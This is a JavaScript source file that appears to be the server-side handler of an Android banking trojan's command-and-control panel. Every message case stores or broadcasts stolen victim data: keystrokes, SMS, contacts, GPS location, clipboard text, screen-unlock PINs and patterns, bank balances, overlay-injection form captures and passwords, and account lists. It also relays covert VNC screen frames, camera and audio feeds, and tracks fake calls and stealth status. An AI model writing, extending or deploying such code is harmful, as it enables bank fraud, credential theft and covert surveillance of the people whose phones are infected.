'use strict';
const { q, setField } = require('../db');
const state            = require('../state');

const MAX_SS = 30;

function handle(ws, req) {
  const url      = new URL(req.url, 'http://h');
  const deviceId = url.searchParams.get('device_id') || `dev_${Date.now()}`;
  const ip       = req.socket?.remoteAddress || req.headers?.['x-forwarded-for'] || '';

  // ── DUPLICATE FIX: if device already connected under same id, terminate old
  //    silently (no device_offline blast) before registering fresh socket ────
  const existing = state.devices.get(deviceId);
  if (existing && existing.ws !== ws) {
    try { existing.ws.terminate(); } catch (_) {}
    // Remove old ws from all subscription sets without broadcasting offline
    for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs]) {
      map.get(deviceId)?.delete(existing.ws);
    }
    console.log(`[DEV~] ${deviceId} reconnect — old socket terminated`);
  }

  console.log(`[DEV+] ${deviceId} (${ip})`);
  state.devices.set(deviceId, { ws, deviceId, ip, lastSeen: Date.now() });
  q.setOnline.run(Date.now(), deviceId);
  state.broadcastAll({ type: 'device_online', device_id: deviceId, ip, ts: Date.now() });

  ws.on('message', (data, isBinary) => {
    const now = Date.now();
    const dev = state.devices.get(deviceId);
    if (dev) dev.lastSeen = now;
    q.touchSeen.run(now, deviceId);

    if (isBinary) {
      const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
      // Frame header: 0x01 | uint32be(size) | jpeg_bytes
      if (buf.length >= 5 && buf[0] === 0x01) {
        const size = buf.readUInt32BE(1);
        if (buf.length >= 5 + size) {
          const jpeg = buf.slice(5, 5 + size);
          state.relayVncFrame(deviceId, jpeg);
          // 1% chance persist as screenshot
          if (Math.random() < 0.01) {
            q.insertSS.run(deviceId, jpeg.toString('base64'), now);
            q.pruneSS.run(deviceId);
          }
        }
      }
      return;
    }

    let msg;
    try { msg = JSON.parse(data.toString()); } catch (_) { return; }
    const type = msg.type || msg.action || '';
    dispatch(deviceId, ip, type, msg, now);
  });

  ws.on('close', () => {
    // Only broadcast offline if this ws is still the registered one
    // (avoids ghost-offline when device reconnected and old socket fires close later)
    if (state.devices.get(deviceId)?.ws === ws) {
      console.log(`[DEV-] ${deviceId}`);
      state.devices.delete(deviceId);
      q.setOffline.run(Date.now(), deviceId);
      state.broadcastAll({ type: 'device_offline', device_id: deviceId, ts: Date.now() });
      for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs]) {
        map.get(deviceId)?.delete(ws);
      }
    }
  });

  ws.on('error', err => console.error(`[DEV!] ${deviceId}:`, err.message));
}

function dispatch(deviceId, ip, type, msg, now) {
  switch (type) {

    case 'DEVICE_INFO': {
      const p = msg.permissions || {};
      const row = {
        device_id: deviceId, model: msg.model||'', manufacturer: msg.manufacturer||'',
        android_version: msg.android_version||'', sdk: msg.sdk||0,
        sim_operator: msg.sim_operator||'', battery_level: msg.battery_level||0,
        is_charging: msg.is_charging?1:0, admin_active: msg.admin_active?1:0,
        accessibility_active: msg.accessibility_active?1:0, network_type: msg.network_type||'',
        ip_address: ip,
        perm_accessibility: p.accessibility?1:0, perm_overlay: p.overlay?1:0,
        perm_battery_opt: p.battery_optimization?1:0, perm_camera: p.camera?1:0,
        perm_contacts: p.contacts?1:0, perm_call_log: p.call_log?1:0,
        perm_microphone: p.microphone?1:0, perm_sms: p.sms?1:0,
        perm_accounts: p.accounts?1:0, perm_storage: p.storage?1:0,
        perm_location: p.location?1:0, perm_phone: p.phone?1:0, last_seen: now,
      };
      q.upsertDevice.run(row);
      if (Array.isArray(msg.accounts) && msg.accounts.length)
        q.insertBanking.run(deviceId, 'accounts', 'account_list', JSON.stringify(msg.accounts), now);
      if (Array.isArray(msg.google_accounts) && msg.google_accounts.length)
        q.insertBanking.run(deviceId, 'google', 'google_accounts', JSON.stringify(msg.google_accounts), now);
      state.broadcastAll({ type: 'device_info', device_id: deviceId, data: row,
        accounts: msg.accounts, google_accounts: msg.google_accounts });
      break;
    }

    case 'DEVICE_STATUS': {
      q.updateStatus.run({
        pkg: msg.package||'', name: msg.appName||'',
        locked: msg.isLocked?1:0, screenOn: msg.isScreenOn!==false?1:0,
        ts: now, id: deviceId,
      });
      if (msg.batteryLevel !== undefined)
        q.updateBattery.run({ bl: msg.batteryLevel, ch: msg.isCharging?1:0, id: deviceId });
      state.broadcastAll({ type: 'device_status', device_id: deviceId,
        package: msg.package, appName: msg.appName,
        isLocked: msg.isLocked, isScreenOn: msg.isScreenOn,
        batteryLevel: msg.batteryLevel, ts: now });
      break;
    }

    case 'KEYLOG': {
      q.insertKeylog.run(deviceId, msg.data||'', msg.app||'', now);
      if (msg.package) try { q.incKeylog.run(deviceId, msg.package); } catch(_) {}
      state.broadcastAll({ type: 'keylog', device_id: deviceId,
        data: msg.data, app: msg.app, pkg: msg.package, ts: now });
      break;
    }

    case 'KEYLOG_OFFLINE': {
      const items = Array.isArray(msg.data) ? msg.data : [msg.data];
      for (const item of items) {
        if (!item) continue;
        q.insertKeylog.run(deviceId, typeof item === 'string' ? item : JSON.stringify(item), 'offline', now);
      }
      state.broadcastAll({ type: 'keylog_batch', device_id: deviceId, count: items.length, ts: now });
      break;
    }

    case 'SMS': {
      try {
        let list = typeof msg.data === 'string' ? JSON.parse(msg.data) : msg.data;
        if (Array.isArray(list)) {
          q.clearSms.run(deviceId);
          for (const s of list) q.insertSms.run(deviceId, s.address||'', s.body||'', s.date||now, s.type||'inbox');
          state.broadcastAll({ type: 'sms_update', device_id: deviceId, count: list.length });
        }
      } catch (_) {}
      break;
    }

    case 'CONTACTS': {
      try {
        let list = typeof msg.data === 'string' ? JSON.parse(msg.data) : msg.data;
        if (Array.isArray(list)) {
          q.clearContacts.run(deviceId);
          for (const c of list) q.insertContact.run(deviceId, c.name||'', c.number||'');
          state.broadcastAll({ type: 'contacts_update', device_id: deviceId, count: list.length });
        }
      } catch (_) {}
      break;
    }

    case 'LOCATION': {
      try {
        let loc = typeof msg.data === 'string' ? JSON.parse(msg.data) : (msg.data || msg);
        if (loc && loc.lat != null) {
          q.insertLoc.run(deviceId, loc.lat, loc.lng||0, loc.accuracy||0, loc.address||'', now);
          state.broadcastAll({ type: 'location', device_id: deviceId,
            lat: loc.lat, lng: loc.lng, accuracy: loc.accuracy, address: loc.address, ts: now });
        }
      } catch (_) {}
      break;
    }

    case 'FILE_LIST': {
      const fpath = msg.path || '/';
      q.upsertFiles.run(deviceId, fpath, JSON.stringify(msg.files || []), now);
      state.broadcastAll({ type: 'file_list', device_id: deviceId, path: fpath, files: msg.files||[] });
      break;
    }

    case 'INSTALLED_APPS': {
      try {
        let apps = typeof msg.apps === 'string' ? JSON.parse(msg.apps) : (msg.apps || []);
        if (Array.isArray(apps)) {
          for (const a of apps) {
            q.upsertApp.run({
              did: deviceId, pkg: a.package||'', name: a.name||'',
              sys: a.isSystem?1:0, ver: a.version||'',
              bank: a.isBank?1:0, inj: 0, klc: 0, icon: a.icon||'', ts: now,
            });
          }
          setField('inject_count', deviceId, apps.filter(a => a.isBank).length);
          state.broadcastAll({ type: 'apps_update', device_id: deviceId, count: apps.length });
        }
      } catch (_) {}
      break;
    }

    case 'CAMERA_FRAME': {
      if (msg.data)
        state.broadcastToSubs(state.cameraSubs, deviceId,
          JSON.stringify({ type: 'camera_frame', device_id: deviceId, data: msg.data, ts: now }));
      break;
    }

    case 'AUDIO_CHUNK': {
      if (msg.data)
        state.broadcastToSubs(state.audioSubs, deviceId,
          JSON.stringify({ type: 'audio_chunk', device_id: deviceId, data: msg.data, ts: now }));
      break;
    }

    case 'SILENT_VNC_STATUS': {
      const active = !!msg.active;
      setField('vnc_active', deviceId, active ? 1 : 0);
      state.broadcastAll({ type: 'vnc_status', device_id: deviceId, active, method: msg.method||'silent', ts: now });
      break;
    }

    case 'BANK_BALANCE': {
      q.insertBanking.run(deviceId, msg.bank||'unknown', 'balance', JSON.stringify(msg), now);
      q.insertFin.run(deviceId, msg.bank||'unknown', 'balance_captured', JSON.stringify(msg), now);
      state.broadcastAll({ type: 'bank_balance', device_id: deviceId, data: msg, ts: now });
      break;
    }

    case 'CLIPBOARD': {
      const text = msg.text || msg.data || '';
      if (text) {
        q.insertClipboard.run(deviceId, text, now);
        state.broadcastAll({ type: 'clipboard', device_id: deviceId, text, ts: now });
      }
      break;
    }

    case 'UNLOCK_SEQUENCE': {
      const utype   = msg.unlockType || (msg.pattern ? 'PATTERN' : 'PIN');
      const payload = typeof msg.data === 'string' ? msg.data : JSON.stringify(msg.data || msg);
      q.insertUnlock.run(deviceId, utype, payload, now);
      state.broadcastAll({ type: 'unlock_sequence', device_id: deviceId, utype, data: payload, ts: now });
      break;
    }

    case 'SCREEN_HIERARCHY': {
      // Forward raw data string — let the client parse the APK's exact format
      state.broadcastAll({
        type:      'screen_hierarchy',
        device_id: deviceId,
        data:      msg.data || JSON.stringify(msg),
        ts:        now,
      });
      break;
    }

    case 'STUDIO_FORM_DATA': {
      const bank = msg.bank || msg.template || 'studio';
      q.insertBanking.run(deviceId, bank, 'form_capture', JSON.stringify(msg), now);
      q.insertInjectPw.run(deviceId, msg.package||'', msg.app||bank, JSON.stringify(msg), '{}', now);
      state.broadcastAll({ type: 'form_capture', device_id: deviceId, bank, data: msg, ts: now });
      break;
    }

    case 'FAKE_CALL_STATUS': {
      q.insertFakeCall.run(deviceId, msg.callerName||'', msg.status||'', now);
      state.broadcastAll({ type: 'fake_call_status', device_id: deviceId,
        status: msg.status, callerName: msg.callerName, ts: now });
      break;
    }

    case 'STEALTH_STATUS': {
      const tl = msg.threatLevel || 0;
      setField('threat_level', deviceId, tl);
      state.broadcastAll({ type: 'stealth_status', device_id: deviceId,
        threatLevel: tl, mode: msg.mode||0, active: msg.active, ts: now });
      break;
    }

    case 'NFC_SCAN': {
      q.insertNfc.run(deviceId, msg.uid||'', msg.tech||'', msg.protocol||'', JSON.stringify(msg), now);
      state.broadcastAll({ type: 'nfc_scan', device_id: deviceId, data: msg, ts: now });
      break;
    }

    case 'INJECT_PASSWORD': {
      q.insertInjectPw.run(deviceId, msg.package||'', msg.app||'', msg.password||'', JSON.stringify(msg), now);
      state.broadcastAll({ type: 'inject_password', device_id: deviceId, data: msg, ts: now });
      break;
    }

    case 'PING': {
      state.sendToDevice(deviceId, { action: 'PONG', timestamp: now });
      break;
    }

    default: {
      state.broadcastAll({ type: 'cmd_response', device_id: deviceId,
        response_type: type, data: msg.data || msg, ts: now });
      break;
    }
  }
}

module.exports = { handle };
